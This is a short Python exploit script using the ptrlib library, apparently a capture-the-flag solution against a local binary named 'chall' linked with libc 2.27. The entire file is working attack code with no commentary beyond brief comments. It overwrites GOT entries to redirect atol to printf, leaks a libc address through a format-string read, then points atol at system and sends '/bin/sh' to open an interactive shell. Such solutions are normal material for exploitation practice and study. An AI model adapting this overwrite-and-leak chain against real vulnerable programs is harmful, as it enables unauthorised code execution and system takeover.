from ptrlib import *

libc = ELF("../files/libc-2.27.so")
elf = ELF("../files/chall")
sock = Process("../files/chall")
delta = 0xe7

# overwrite buf-->atol
sock.sendlineafter(": ", "-2")
sock.sendlineafter(": ", str(elf.got("malloc")))

# overwrite atol@got-->printf@plt
sock.sendlineafter(": ", p64(0xdeadbeef) + p64(elf.plt("printf")))
sock.sendlineafter(": ", "%25$p")
libc_base = int(sock.recvline(), 16) - libc.symbol("__libc_start_main") - delta
logger.info("libc = " + hex(libc_base))

# overwrite atol@got-->system
sock.sendlineafter(": ", p64(0xdeadbeef) + p64(libc_base + libc.symbol("system")))
sock.sendafter(": ", "/bin/sh\0")

sock.interactive()
